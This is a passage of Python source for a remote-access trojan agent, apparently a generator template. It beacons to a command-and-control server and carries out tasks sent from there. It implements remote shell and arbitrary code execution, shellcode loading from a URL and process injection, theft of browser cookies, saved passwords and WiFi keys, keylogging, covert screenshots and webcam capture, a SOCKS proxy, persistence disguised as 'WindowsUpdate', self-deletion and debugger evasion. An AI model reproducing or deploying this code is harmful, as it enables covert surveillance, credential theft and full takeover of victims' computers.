            # Also register in global registry for cross-command management
            _register_process(process_id, proc, command)
            
            # Start a thread to monitor the process and send results when done
            def monitor_process(pid, proc_obj):
                try:
                    # Wait for process to complete (with timeout)
                    stdout, stderr = proc_obj.communicate(timeout=30)
                    returncode = proc_obj.returncode
                    
                    # Get updated current directory
                    current_dir = os.getcwd()
                    
                    # Send the result back via socket
                    if self.socket and self.connected:
                        try:
                            self.socket.emit('command_result', {{
                                'agent_id': self.agent_id,
                                'command': self.running_processes[pid]['command'] if pid in self.running_processes else '',
                                'output': stdout,
                                'error': stderr,
                                'current_dir': current_dir,
                                'returncode': returncode
                            }}, namespace='/terminal')
                        except Exception as e:
                            self.logger.error(f"Failed to emit command result: {{str(e)}}")
                except subprocess.TimeoutExpired:
                    proc_obj.kill()
                    stdout, stderr = proc_obj.communicate()
                    if self.socket and self.connected:
                        try:
                            self.socket.emit('command_result', {{
                                'agent_id': self.agent_id,
                                'command': self.running_processes[pid]['command'] if pid in self.running_processes else '',
                                'output': stdout,
                                'error': 'Command timed out after 30 seconds',
                                'current_dir': os.getcwd(),
                                'returncode': -1
                            }}, namespace='/terminal')
                        except Exception as e:
                            self.logger.error(f"Failed to emit timeout result: {{str(e)}}")
                except Exception as e:
                    self.logger.error(f"Error monitoring process: {{str(e)}}")
                finally:
# Clean up the process from tracking
                    if pid in self.running_processes:
                        del self.running_processes[pid]
                    
                    # Also unregister from global registry
                    _unregister_process(pid)
            
            # Start monitoring thread
            threading.Thread(target=monitor_process, args=(process_id, proc), daemon=True).start()
            
            # Send immediate response with process_id so user knows it's running
            if self.socket and self.connected:
                try:
                    self.socket.emit('command_result', {{
                        'agent_id': self.agent_id,
                        'command': command,
                        'output': '',
                        'error': '',
                        'current_dir': self.current_dir,
                        'running': True,
                        'process_id': process_id
                    }}, namespace='/terminal')
                except Exception as e:
                    self.logger.error(f"Failed to emit running status: {{str(e)}}")
            
            # Return immediately with running status
            return {{
                'output': '',
                'error': '',
                'current_dir': self.current_dir,
                'running': True,
                'process_id': process_id
            }}

        except Exception as e:
            return {{
                'error': str(e),
                'current_dir': self.current_dir
            }}

    def disconnect(self):
        if self.socket:
            try:
                self.logger.info("Disconnecting WebSocket")
                self.socket.disconnect()
                self.socket = None
            except Exception as e:
                self.logger.error(f"Disconnect error: {{str(e)}}")
        self.connected = False

# ======================
# Main Agent Class
# ======================
class Agent:
    def __init__(self):
        self.config = Config()
        self.crypto = Crypto(self.config.AES_KEY, self.config.AES_IV)
        self.agent_id = self._generate_agent_id()
        self._setup_logger()
        self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
        self.keylogger = Keylogger()
        self.ws_client = None
        self.last_checkin = 0
        self.jitter = 0.3
        self._initial_checkin = None
        self._checkin_count = 0
        self._running = True
        self._executed_task_ids = set()

    def _setup_logger(self):
        self.logger = logging.getLogger('agent')
        self.logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(handler)

    def _log(self, level, message):
        if level == 'debug':
            self.logger.debug(message)
        elif level == 'info':
            self.logger.info(message)
        elif level == 'warning':
            self.logger.warning(message)
        elif level == 'error':
            self.logger.error(message)

    def _log_error(self, message):
        self.logger.error(message)

    def _log_info(self, message):
        self.logger.info(message)

    def _generate_agent_id(self):
        return f"{{platform.node()}}-{{os.getlogin()}}-{{hash(os.getcwd())}}"

    def _get_checkin_data(self):
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            ip = "unknown"
        data = {{
            "agent_id": self.agent_id,
            "hostname": platform.node(),
            "username": os.getlogin(),
            "os": platform.platform(),
             "privilege": "SYSTEM" if platform.system() == "Windows" and os.getlogin().upper() == "SYSTEM" else "admin" if (platform.system() == "Windows" and ctypes.windll.shell32.IsUserAnAdmin()) or (platform.system() != "Windows" and os.getuid() == 0) else "user",
            "ip": ip,
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
            "checkin_interval": self.config.CHECKIN_INTERVAL,
            "killdate": self.config.KILLDATE if self.config.KILLDATE_ENABLED else None
        }}

        # Remove automatic credential collection from checkin
        # Credentials will now be collected only when explicitly requested via tasks
        
        if self.config.TAKE_SCREENSHOTS:

            if self._checkin_count % self.config.SCREENSHOT_FREQUENCY == 0:
                screenshot = SystemUtils.take_screenshot()
                if screenshot:
                    data["screenshot"] = screenshot

        # Small delay to ensure screenshot is processed before webcam
        if self.config.TAKE_WEBCAM:
            time.sleep(2)

            if self._checkin_count % self.config.WEBCAM_FREQUENCY == 0:
                webcam = SystemUtils.capture_webcam()
                if webcam:
                    data["webcam"] = webcam

        self._checkin_count += 1
        return data
    
    def _immediate_self_destruct(self):
        """Force immediate termination with server notification"""
        try:
            # 1. Disconnect all active connections
            self.stop()
            
            # 2. Remove all persistence mechanisms
            self._remove_persistence()
            
            # 3. Additional cleanup - delete temporary files
            self._cleanup_temp_files()
            
            # 4. Try to notify server (best effort)
            try:
                requests.post(
                    f"{{self.config.C2_SERVER}}/api/agent_terminated",
                    data=self.crypto.encrypt({{
                        "agent_id": self.agent_id,
                        "status": "killed",
                        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                    }}),
                    headers={{
                        "User-Agent": self.config.USER_AGENT,
                        "Content-Type": "application/octet-stream"
                    }},
                    timeout=2,
                    verify=False
                )
            except:
                pass
            
            # 5. Forceful process termination
            self._force_kill_process()
            
        except Exception as e:
            self._log_error(f"Termination error: {{str(e)}}")
        finally:
            os._exit(0)

    def _cleanup_temp_files(self):
        """Clean up any temporary files created by the agent"""
        try:
            temp_dirs = [
                os.path.join(os.getenv('TEMP'), 'cookie_stealer'),
                os.path.join(os.getenv('PUBLIC'), 'documents')
            ]
            
            for temp_dir in temp_dirs:
                try:
                    if os.path.exists(temp_dir):
                        shutil.rmtree(temp_dir, ignore_errors=True)
                except:
                    pass
        except:
            pass

    def _force_kill_process(self):
        """Platform-specific forceful process termination"""
        try:
            if platform.system() == "Windows":
                # Windows specific forceful termination
                import ctypes
                PROCESS_TERMINATE = 0x0001
                handle = ctypes.windll.kernel32.OpenProcess(
                    PROCESS_TERMINATE, 
                    False, 
                    os.getpid()
                )
                ctypes.windll.kernel32.TerminateProcess(handle, -1)
                ctypes.windll.kernel32.CloseHandle(handle)
            else:
                # Unix-like systems
                os.kill(os.getpid(), signal.SIGKILL)
        except:
            os._exit(0)



    def _check_killdate(self):
        try:
            # Skip if killdate is not enabled or empty
            if not self.config.KILLDATE_ENABLED or not self.config.KILLDATE:
                return False
                
            # Parse and compare dates
            current_datetime = datetime.now()
            killdatetime = datetime.strptime(self.config.KILLDATE, "%Y-%m-%d %H:%M")
            return current_datetime >= killdatetime
            
        except Exception as e:
            self._log_error(f"Error checking killdate: {{str(e)}}")
            return False
        
    def _self_destruct(self):
        """Remove persistence and delete itself"""
        self._log_info("[!] Kill command received - initiating self-destruct")
        
        # 1. Remove persistence
        self._remove_persistence()
        
        # 2. Notify C2 (try best effort but don't block if it fails)
        try:
            data = {{
                "agent_id": self.agent_id,
                "message": "Kill command executed - self-destruct initiated",
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
            }}
            
            requests.post(
                f"{{self.config.C2_SERVER}}/api/killdate_reached",
                data=self.crypto.encrypt(data),
                headers={{
                    "User-Agent": self.config.USER_AGENT,
                    "Content-Type": "application/octet-stream"
                }},
                timeout=5,  # Short timeout since we're shutting down
                verify=False
            )
        except Exception as e:
            self._log_error(f"Error notifying C2: {{str(e)}}")
        
        # 3. Delete itself
        self._delete_self()
        
        # 4. Exit
        sys.exit(0)
    
    def _remove_persistence(self):
        """Remove scheduled task and registry entries"""
        try:
            # Remove scheduled task
            task_name = "WindowsUpdate"  # Should match the name used in Persistence._create_scheduled_task()
            subprocess.run(['schtasks', '/Delete', '/TN', task_name, '/F'], 
                          creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Remove registry entries
            try:
                # Admin path
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo",
                                    0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key, "engine")
                winreg.DeleteValue(key, "lube")
                winreg.CloseKey(key)
            except WindowsError:
                try:
                    # Non-admin path
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                       r"Software\Microsoft\Accessibility\Setup",
                                       0, winreg.KEY_ALL_ACCESS)
                    winreg.DeleteValue(key, "engine")
                    winreg.DeleteValue(key, "lube")
                    winreg.CloseKey(key)
                except WindowsError:
                    pass
            
            # Remove Run key entry
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Run",
                                   0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, task_name)
                winreg.CloseKey(key)
            except WindowsError:
                pass
                
        except Exception as e:
            self._log_error(f"Error removing persistence: {{str(e)}}")
    
    def _notify_killdate_reached(self):
        """Send notification to C2 that killdate was reached"""
        try:
            data = {{
                "agent_id": self.agent_id,
                "message": "Killdate reached - self-destruct initiated",
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
            }}
            
            requests.post(
                f"{{self.config.C2_SERVER}}/api/killdate_reached",
                data=self.crypto.encrypt(data),
                headers={{
                    "User-Agent": self.config.USER_AGENT,
                    "Content-Type": "application/octet-stream"
                }},
                timeout=10,
                verify=False
            )
        except Exception as e:
            self._log_error(f"Error notifying C2: {{str(e)}}")
    
    def _delete_self(self):
        """Delete the agent executable"""
        try:
            # Get current executable path
            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            
            # Schedule deletion on next reboot since we can't delete a running executable
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.kernel32.MoveFileExW(
                    exe_path,
                    None,
                    0x00000004  # MOVEFILE_DELAY_UNTIL_REBOOT
                )
                
                # Also try to delete immediately (won't work but might help in some cases)
                try:
                    os.remove(exe_path)
                except:
                    pass
        except Exception as e:
            self._log_error(f"Error scheduling self-deletion: {{str(e)}}")

    def _execute_task(self, task):
        try:
            task_id = task.get("task_id")
            task_id_str = str(task_id)
            self._log_info(f"Checking task ID: {{task_id_str}} (type: {{type(task_id)}})")
            self._log_info(f"Current executed task IDs: {{self._executed_task_ids}}")
            if task_id_str in self._executed_task_ids:
                self._log_info(f"Skipping execution of duplicate task with ID: {{task_id_str}}")
                return None
            else:
                self._log_info(f"Executing new task with ID: {{task_id_str}}")
                self._executed_task_ids.add(task_id_str)

            task_type = task.get("type")
                        # Log task without dumping huge binary data
            try:
                log_task = task.copy()
                if 'data' in log_task and isinstance(log_task['data'], str) and len(log_task['data']) > 500:
                    log_task['data'] = f"<Binary Data: {{len(log_task['data'])}} bytes>"
                self._log_info(f"Received task: {{json.dumps(log_task, indent=2)}}")
            except:
                self._log_info(f"Received task type: {{task_type}}")
            
            # Handle different task types from web interface
            if task_type == "execute_python":
                code = task.get("data", {{}}).get("code", "")
                if not code:
                    return {{
                        "status": "error",
                        "message": "No Python code provided"
                    }}
                
                self._log_info("Executing Python code in memory")
                try:
                    # Execute the code in a new scope
                    local_vars = {{}}
                    exec(code, globals(), local_vars)
                    return {{
                        "status": "success",
                        "message": "Python script executed successfully",
                        "output": str(local_vars.get('result', 'Execution completed'))
                    }}
                except Exception as e:
                    self._log_error(f"Python execution error: {{str(e)}}")
                    return {{
                        "status": "error",
                        "message": f"Python execution failed: {{str(e)}}"
                    }}

            elif task_type == "websocket":
                action = task.get("action") or task.get("data", {{}}).get("action")
                if not action:
                    self._log_error("WebSocket task missing action parameter")
                    return {{
                        "status": "error",
                        "message": "WebSocket task requires 'action' parameter"
                    }}
                
                self._log_info(f"Processing WebSocket {{action}} request")
                
                if action == "start":
                    if not hasattr(self, 'ws_client') or not self.ws_client:
                        self._log_info("Initializing new WebSocket client")
                        self.ws_client = WebSocketClient(
                            self.agent_id,
                            self.crypto,
                            self.config.C2_SERVER,
                            self.config,
                            '/terminal'
                        )
                    
                    if not self.ws_client.connected:
                        self._log_info("Attempting WebSocket connection...")
                        if self.ws_client.connect():
                            return {{
                                "status": "success",
                                "message": "WebSocket connected",
                                "action": "start"
                            }}
                        else:
                            return {{
                                "status": "error",
                                "message": "Failed to connect WebSocket",
                                "action": "start"
                            }}
                    return {{
                        "status": "success",
                        "message": "WebSocket already connected",
                        "action": "start"
                    }}
                
                elif action == "stop":
                    if hasattr(self, 'ws_client') and self.ws_client and self.ws_client.connected:
                        self.ws_client.disconnect()
                        return {{
                            "status": "success",
                            "message": "WebSocket disconnected",
                            "action": "stop"
                        }}
                    return {{
                        "status": "error",
                        "message": "No active WebSocket connection",
                        "action": "stop"
                    }}
            
            elif task_type == "shell":
                # This matches the "shell" option in the web interface
                command = task.get("data", {{}}).get("cmd", "")
                if not command:
                    return {{
                        "status": "error",
                        "message": "No command provided"
                    }}

                current_dir = os.getcwd()

                if command.lower().startswith("cd "):
                    new_dir = command[3:].strip()
                    try:
                        if new_dir:
                            os.chdir(new_dir)
                        current_dir = os.getcwd()
                        return {{
                            "status": "success",
                            "output": f"Current directory is now: {{current_dir}}",
                            "current_dir": current_dir
                        }}
                    except Exception as e:
                        return {{
                            "status": "error",
                            "error": str(e),
                            "current_dir": current_dir
                        }}

                result = subprocess.run(
                    command,
                    shell=True,
                    cwd=current_dir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=30
                )
                current_dir = os.getcwd()

                return {{
                    "status": "success",
                    "output": result.stdout,
                    "error": result.stderr,
                    "current_dir": current_dir,
                    "terminal": True  # This flag helps the server identify terminal output
                }}

            #Kill-pill
            elif task_type == "kill":
                if task.get("data", {{}}).get("force"):
                    # Send confirmation before killing
                    try:
                        requests.post(
                            f"{{self.config.C2_SERVER}}/api/agent_terminated",
                            data=self.crypto.encrypt({{
                                "agent_id": self.agent_id,
                                "status": "killing",
                                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                            }}),
                            headers={{
                                "User-Agent": self.config.USER_AGENT,
                                "Content-Type": "application/octet-stream"
                            }},
                            timeout=2,
                            verify=False
                        )
                    except:
                        pass
                    
                    self._immediate_self_destruct()
                    return {{"status": "killing"}}
                
                # Normal kill with cleanup
                self._log_info("[!] Received kill command - initiating self-destruct")
                
                # Send confirmation first
                try:
                    requests.post(
                        f"{{self.config.C2_SERVER}}/api/agent_terminated",
                        data=self.crypto.encrypt({{
                            "agent_id": self.agent_id,
                            "status": "killing",
                            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                        }}),
                        headers={{
                            "User-Agent": self.config.USER_AGENT,
                            "Content-Type": "application/octet-stream"
                        }},
                        timeout=2,
                        verify=False
                    )
                except:
                    pass
                    
                self._self_destruct()
                return {{"status": "destructing"}}


            elif task_type == "shellcode":
                try:
                    runner_url = task.get("data", {{}}).get("runner_url")

                    if not runner_url:
                        return {{
                            "status": "error",
                            "message": "No runner URL provided"
                        }}

                    self._log_info(f"Starting shellcode execution from: {{runner_url}}")

                    # Execute the runner script and capture output
                    def run_shellcode_async():
                        try:
                            result = ShellcodeRunner.execute_runner(runner_url)
                            self._log_info(f"Shellcode execution result: {{result}}")

                            # Send the captured output back to the C2 server
                            try:
                                output_data = {{
                                    'agent_id': self.agent_id,
                                    'task_id': task.get("task_id"),
                                    'status': result.get('status', 'unknown'),
                                    'message': result.get('message', ''),
                                    'output': result.get('stdout', '') + result.get('stderr', ''),
                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                                }}

                                response = requests.post(
                                    f"{{self.config.C2_SERVER}}/api/shellcode_output",
                                    json=output_data,
                                    headers={{
                                        "User-Agent": self.config.USER_AGENT,
                                        "Content-Type": "application/json"
                                    }},
                                    timeout=30,
                                    verify=False
                                )

                                if response.status_code == 200:
                                    self._log_info("Shellcode output sent to C2 server successfully")
                                else:
                                    self._log_error(f"Failed to send shellcode output to C2 server: {{response.status_code}}")

                            except Exception as e:
                                self._log_error(f"Failed to send shellcode output to C2 server: {{str(e)}}")

                        except Exception as e:
                            self._log_error(f"Async shellcode execution failed: {{str(e)}}")

                    threading.Thread(target=run_shellcode_async, daemon=True).start()

                    return {{
                        "status": "success",
                        "message": "Shellcode execution started in background"
                    }}

                except Exception as e:
                    self._log_error(f"Shellcode processing failed: {{str(e)}}")
                    return {{
                        "status": "error",
                        "message": f"Shellcode execution failed: {{str(e)}}"
                    }}



            elif task_type == "screenshot":
                self._log_info("Starting screenshot task")
                screenshot = SystemUtils.take_screenshot()
                if screenshot:
                    return {{
                        "status": "success",
                        "screenshot": screenshot
                    }}
                return {{"status": "error", "message": "Failed to capture screenshot"}}
            
            elif task_type == "webcam":
                self._log_info("Starting webcam capture task")
                webcam = SystemUtils.capture_webcam()
                if webcam:
                    return {{
                        "status": "success",
                        "webcam": webcam
                    }}
                return {{"status": "error", "message": "Failed to capture webcam"}}
            
            
            
            elif task_type == "steal_cookies":
                try:
                    self._log_info("Starting cookie stealing task")
                    stealer = CookieStealer(logger=self.logger, config=self.config)
                    results = stealer.steal_cookies()

                    if not results:
                        return {{
                            "status": "error",
                            "message": "No cookies were stolen"
                        }}

                    return {{
                        "status": "success",
                        "message": f"Stole cookies from {{len(results)}} browsers",
                        "results": results
                    }}
                except Exception as e:
                    self._log_error(f"Cookie stealing failed: {{str(e)}}")
                    return {{
                        "status": "error",
                        "message": str(e)
                    }}

            elif task_type == "harvest_creds":
                try:
                    self._log_info("Starting credential harvesting task")
                    credentials_data = CredentialHarvester.get_browser_credentials()

                    return {{
                        "status": "success",
                        "message": f"Harvested {{len(credentials_data.get('credentials', []))}} credentials, {{len(credentials_data.get('history', []))}} history entries, and {{len(credentials_data.get('wifi', []))}} WiFi passwords",
                        "credentials": credentials_data.get('credentials', []),
                        "history": credentials_data.get('history', []),
                        "wifi": credentials_data.get('wifi', [])
                    }}
                except Exception as e:
                    self._log_error(f"Credential harvesting failed: {{str(e)}}")
                    return {{
                        "status": "error",
                        "message": str(e)
                    }}

            
            elif task_type == "upload":
                task_info = task.get("data", {{}})
                if not isinstance(task_info, dict):
                    task_info = task
                return SystemUtils.upload_file(task_info.get("path", ""))
            
            elif task_type == "download":
                # The server wraps filename/data inside task[\'data\']
                task_info = task.get("data", {{}})
                if not isinstance(task_info, dict):
                    task_info = task
                
                return SystemUtils.download_file(
                    task_info.get("filename", ""),
                    task_info.get("data", ""),
                    task_info.get("folder", None))
            
            elif task_type == "persist":
                self._log_info("Installing persistence")
                return Persistence.install(self.config.C2_SERVER)
            
            elif task_type == "inject":
                return ProcessInjector.inject_shellcode(
                    task.get("pid", 0),
                    base64.b64decode(task.get("shellcode", "")))
            
            elif task_type == "socks5":
                if task.get("action") == "start":
                    return self.socks_proxy.start()
                else:
                    return self.socks_proxy.stop()
            
            elif task_type == "remote_desktop":
                action = task.get("action") or task.get("data", {{}}).get("action")
                if action == "start":
                    if not hasattr(self, 'remote_desktop_handler') or not self.remote_desktop_handler:
                        self.remote_desktop_handler = RemoteDesktopHandler(
                            self.agent_id,
                            self.crypto,
                            self.config.C2_SERVER,
                            self.config
                        )
                    if self.remote_desktop_handler.connect():
                        return {{
                            "status": "success",
                            "message": "Remote Desktop connected",
                            "action": "start"
                        }}
                    else:
                        return {{
                            "status": "error",
                            "message": "Failed to connect Remote Desktop",
                            "action": "start"
                        }}
                elif action == "stop":
                    if hasattr(self, 'remote_desktop_handler') and self.remote_desktop_handler and self.remote_desktop_handler.connected:
                        self.remote_desktop_handler.disconnect()
                        return {{
                            "status": "success",
                            "message": "Remote Desktop disconnected",
                            "action": "stop"
                        }}
                    return {{
                        "status": "error",
                        "message": "No active Remote Desktop connection",
                        "action": "stop"
                    }}

            if task_type in ["keylogger", "keylogger_start", "keylogger_stop"]:
                action = task.get("action") or task.get("data", {{}}).get("action")
                if action == "start":
                    if not hasattr(self, 'keylogger_ws_client') or not self.keylogger_ws_client or not self.keylogger_ws_client.connected:
                        self.keylogger_ws_client = WebSocketClient(
                            self.agent_id,
                            self.crypto,
                            self.config.C2_SERVER,
                            self.config,
                            '/keylogger'
                        )
                    if self.keylogger_ws_client.connect():
                        self.keylogger.ws_client = self.keylogger_ws_client
                    else:
                        return {{"status": "error", "message": "Failed to connect WebSocket for keylogger"}}
                    return self.keylogger.start()
                elif action == "stop":
                    self._log_info("Stopping keylogger")
                    # Send any remaining logs before stopping
                    if self.keylogger.ws_client and self.keylogger.running:
                        self.keylogger._send_logs()
                    result = self.keylogger.get_logs()
                    self.keylogger.stop()
                    if hasattr(self, 'keylogger_ws_client') and self.keylogger_ws_client and self.keylogger_ws_client.connected:
                        self._log_info("Disconnecting keylogger WebSocket client")
                        self.keylogger_ws_client.disconnect()
                    self.keylogger.ws_client = None
                    self.keylogger_ws_client = None
                    return {{"logs": result}}

                else:
                    return {{
                        "status": "error",
                        "message": f"Unknown task type: {{task_type}}"
                    }}
        
        except Exception as e:
            self._log_error(f"Error executing task: {{str(e)}}")
            return {{
                "status": "error",
                "message": f"Task execution failed: {{str(e)}}"
            }}

    def beacon(self):
        self._log_info("[*] Starting beacon loop...")
        first_checkin = True  # Flag for first checkin
        
        while self._running:
            try:
                # Check killdate first
                if self._check_killdate():
                    self._self_destruct()
                    return 
                
                # Skip sleep for first checkin
                if not first_checkin:
                    sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
                    time.sleep(sleep_time)
                
                checkin_data = self._get_checkin_data()
                encrypted_data = self.crypto.encrypt(checkin_data)
                
                response = requests.post(
                    f"{{self.config.C2_SERVER}}/api/checkin",
                    data=encrypted_data,
                    headers={{
                        "User-Agent": self.config.USER_AGENT,
                        "Content-Type": "application/octet-stream"
                    }},
                    timeout=30,
                    verify=False
                )
                
                if response.status_code == 200:
                    task = self.crypto.decrypt(response.content)
                    
                    if task.get("type") != "noop":
                        result = self._execute_task(task)
                        
                        requests.post(
                            f"{{self.config.C2_SERVER}}/api/task_result",
                            data=self.crypto.encrypt({{
                                "task_id": task.get("task_id"),
                                "agent_id": self.agent_id,
                                "task_type": task.get("type"),
                                "result": result
                            }}),
                            headers={{
                                "User-Agent": self.config.USER_AGENT,
                                "Content-Type": "application/octet-stream"
                            }},
                            timeout=30,
                            verify=False
                        )
                    # Handle shellcode tasks normally - they execute asynchronously
                    # and send results back via HTTP callback
                
                # After first checkin, set flag to False
                if first_checkin:
                    first_checkin = False
                    
            except requests.exceptions.RequestException as e:
                self._log_error(f"Connection error: {{str(e)}}")
                time.sleep(self.config.CHECKIN_INTERVAL * 2)
            except Exception as e:
                self._log_error(f"Error in beacon: {{str(e)}}")
                time.sleep(self.config.CHECKIN_INTERVAL * 2)

    def stop(self):
        self._running = False
        self.socks_proxy.stop()
        self.keylogger.stop()
        if self.ws_client:
            self.ws_client.disconnect()

    def run(self):
        self._log_info("[*] Starting agent...")
        self.beacon()

if __name__ == "__main__":
    def is_debugging():
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent() != 0:
                    print("[!] Debugger detected - exiting")
                    return True
            return False
        except:
            return False
    
    if is_debugging():
        sys.exit(0)
    
    try:
        agent = Agent()
        agent.run()
    except Exception as e:
        print(f"[!] Agent crashed: {{str(e)}}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

